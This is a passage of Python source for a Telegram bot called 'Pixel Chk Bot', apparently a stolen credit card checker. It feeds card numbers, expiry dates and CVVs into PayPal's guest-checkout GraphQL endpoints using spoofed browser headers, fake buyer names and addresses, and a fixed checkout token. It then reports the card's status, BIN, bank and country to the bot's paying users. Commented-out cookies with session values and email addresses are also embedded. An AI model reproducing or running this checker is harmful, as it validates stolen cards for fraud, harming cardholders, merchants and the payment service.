JiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=desktop&experiment.enableVenmo=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&merchantID.0=3X58HNF7LF7RU&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true&disableSetCookie=true&experimentation.experience=107634&experimentation.treatment=137602',
    'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
}

    params = {
    'sessionID': 'uid_59a9ad8efc_mty6mtc6nte',
    'buttonSessionID': 'uid_1dc04b4400_mty6mze6mdc',
    'locale.x': 'en_US',
    'commit': 'true',
    'env': 'production',
    'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWJaN0RaUmFKSTZ6YWo0cTZzR3FNb2UtMS1nYXdLbXFDZ25GY0swMHY4U3lOaGVrOF9rcTYyM29CZ01QQlNCODBDR3RDLTB5RlpkcUNaWGkmbWVyY2hhbnQtaWQ9M1g1OEhORjdMRjdSVSZjdXJyZW5jeT1VU0QmY29tcG9uZW50cz1idXR0b25zIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiUG93cl9TUF9QQ1AiLCJkYXRhLXVpZCI6InVpZF9wb212cnBqenh1b3NrZ3NpeXp6Ynhpc2FtcWlmdnEifX0',
    'disable-card': '',
    'token': token,
}

    response = session.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers)

    headers = {
    'authority': 'www.paypal.com',
    'accept': '*/*',
    'accept-language': 'es-419,es;q=0.9',
    'content-type': 'application/json',
    # 'cookie': 'enforce_policy=ccpa; LANG=es_XC%3BUS; nsid=s%3AvpYdedXlFW_a__ZRiKqad10DIEaYeXwt.CUMz5NlcuTyZF%2F1eBKx6EL6P5vS9ovTP1LVYW7YJiWg; ts_c=vr%3D99a2e06d18a0a1f1ac98fee5fb079a28%26vt%3D99a2e06d18a0a1f1ac98fee5fb079a27; KHcl0EuY7AKSMgfvHl7J5E7hPtK=4FaKly4QGsJSxuz2rvkdPS60gfrrr5BojVnN4771Zj7XgF8TIceEUh9RF-KLaxeTf7od-5rE8NescfDc; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAOpn4HSvy-C6uxuaicMYmppgAPvzPvtOTSwC1R3_K2do2mCRWbBpoD_NpL00PdxF6KGolbpeNBcsTzJQfYnr2igrH1zdQ; login_email=pepegl9304%40gmail.com; l7_az=dcg13.slc; tsrce=checkoutjs; x-pp-s=eyJ0IjoiMTY5NDc5NjIwMTg2MiIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1789490601%26vteXpYrS%3D1694798001%26vr%3D99a2e06d18a0a1f1ac98fee5fb079a28%26vt%3D99a2e06d18a0a1f1ac98fee5fb079a27%26vtyp%3Dnew',
    'origin': 'https://www.paypal.com',
    'paypal-client-context': token,
    'paypal-client-metadata-id': token,
    'referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_59a9ad8efc_mty6mtc6nte&buttonSessionID=uid_1dc04b4400_mty6mze6mdc&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWJaN0RaUmFKSTZ6YWo0cTZzR3FNb2UtMS1nYXdLbXFDZ25GY0swMHY4U3lOaGVrOF9rcTYyM29CZ01QQlNCODBDR3RDLTB5RlpkcUNaWGkmbWVyY2hhbnQtaWQ9M1g1OEhORjdMRjdSVSZjdXJyZW5jeT1VU0QmY29tcG9uZW50cz1idXR0b25zIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiUG93cl9TUF9QQ1AiLCJkYXRhLXVpZCI6InVpZF9wb212cnBqenh1b3NrZ3NpeXp6Ynhpc2FtcWlmdnEifX0&disable-card=&token=EC-9W0055348M5941316',
    'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'x-app-name': 'standardcardfields',
    'x-country': 'US',
}

    json_data = {
    'query': '\n          query (\n            $cardNumber: String!\n            $token: String!\n          ) {\n            currencyConversionFromCreditCard(\n              cardNumber: $cardNumber\n              token: $token\n            ) {\n                spread\n                rateFormatted\n                to {\n                  currencySymbol\n                  currencyCode\n                  currencyFormatSymbolISOCurrency\n                }\n                from {\n                  currencySymbol\n                  currencyCode\n                  currencyFormatSymbolISOCurrency\n                }\n                feeRate\n            }\n          }\n        ',
    'variables': {
        'cardNumber': cc,
        'token': token,
    },
    'operationName': None,
}

    response = session.post(
    'https://www.paypal.com/graphql?fetch_currency_conversion',
    headers=headers,
    json=json_data,
)

    headers = {
    'authority': 'www.paypal.com',
    'accept': '*/*',
    'accept-language': 'es-419,es;q=0.9',
    'content-type': 'application/json',
    # 'cookie': 'enforce_policy=ccpa; LANG=es_XC%3BUS; nsid=s%3AvpYdedXlFW_a__ZRiKqad10DIEaYeXwt.CUMz5NlcuTyZF%2F1eBKx6EL6P5vS9ovTP1LVYW7YJiWg; ts_c=vr%3D99a2e06d18a0a1f1ac98fee5fb079a28%26vt%3D99a2e06d18a0a1f1ac98fee5fb079a27; KHcl0EuY7AKSMgfvHl7J5E7hPtK=4FaKly4QGsJSxuz2rvkdPS60gfrrr5BojVnN4771Zj7XgF8TIceEUh9RF-KLaxeTf7od-5rE8NescfDc; l7_az=dcg01.phx; login_email=pepeg9dfg304%40gmail.com; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAOmiK1JnckO8_KkDkUdv6inllidExLynkK0G4SQYz9CY0K6hWatS2ThmY9dP-aKHsmG7sbeXWKJjbY54biG0UDI2BKe1Q; tsrce=checkoutjs; x-pp-s=eyJ0IjoiMTY5NDc5NjI3NzM1NCIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1789490677%26vteXpYrS%3D1694798077%26vr%3D99a2e06d18a0a1f1ac98fee5fb079a28%26vt%3D99a2e06d18a0a1f1ac98fee5fb079a27%26vtyp%3Dnew',
    'origin': 'https://www.paypal.com',
    'paypal-client-context': token,
    'paypal-client-metadata-id': token,
    'referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_59a9ad8efc_mty6mtc6nte&buttonSessionID=uid_1dc04b4400_mty6mze6mdc&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWJaN0RaUmFKSTZ6YWo0cTZzR3FNb2UtMS1nYXdLbXFDZ25GY0swMHY4U3lOaGVrOF9rcTYyM29CZ01QQlNCODBDR3RDLTB5RlpkcUNaWGkmbWVyY2hhbnQtaWQ9M1g1OEhORjdMRjdSVSZjdXJyZW5jeT1VU0QmY29tcG9uZW50cz1idXR0b25zIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiUG93cl9TUF9QQ1AiLCJkYXRhLXVpZCI6InVpZF9wb212cnBqenh1b3NrZ3NpeXp6Ynhpc2FtcWlmdnEifX0&disable-card=&token=EC-9W0055348M5941316',
    'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'x-app-name': 'standardcardfields',
    'x-country': 'US',
}

    json_data = {
    'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
    'variables': {
        'token': token,
        'card': {
            'cardNumber': cc,
            'expirationDate': f'{mes}/{ano}',
            'postalCode': '10080',
            'securityCode': cvv,
        },
        'phoneNumber': '4259885369',
        'firstName': 'Juan',
        'lastName': 'fefe',
        'billingAddress': {
            'givenName': 'Juan',
            'familyName': 'fefe',
            'line1': 'Elgin St',
            'line2': None,
            'city': 'New York',
            'state': 'GA',
            'postalCode': '10080',
            'country': 'US',
        },
        'shippingAddress': {
            'givenName': 'Juan',
            'familyName': 'fefe',
            'line1': 'Elgin St',
            'line2': None,
            'city': 'New York',
            'state': 'GA',
            'postalCode': '10080',
            'country': 'US',
        },
        'email': 'pepeg9dfefg304@gmail.com',
        'currencyConversionType': 'PAYPAL',
    },
    'operationName': None,
}


    response = session.post(
    'https://www.paypal.com/graphql?fetch_credit_form_submit',
    headers=headers,
    json=json_data,
)
    
    code = response.text.split('"code":"')[1].split('"')[0]
    status_ = await response_sh(response)
    user = message.from_user.username
    message = response.text.split('"message":"')[1].split('"')[0]
    await contra.edit_text(f"""<b>𝙿𝚒𝚡𝚎𝚕 𝙲𝚑𝚔 𝙱𝚘𝚝

<b><a href="https://t.me/PixelReferencia">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/ShibaTX">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/ShibaTX">ඩා</a>⧽ Status: <code>{status_}</code></b> 
⧼<a href="https://t.me/ShibaTX">ඩා</a>⧽ Reponse: <code>{response}</code>╻<code>{code}</code></b> 
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/ShibaTX">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/ShibaTX">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/ShibaTX">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/ShibaTX">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/ShibaTX">ඩා</a>⧽ Gateways: <code> Paypal </code>

⪨<a href="https://t.me/ShibaTX">🜲</a>⪩ User: @{user} [{encontrar_usuario["plan"]}]
<a href="https://t.me/PixelReferencia">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True)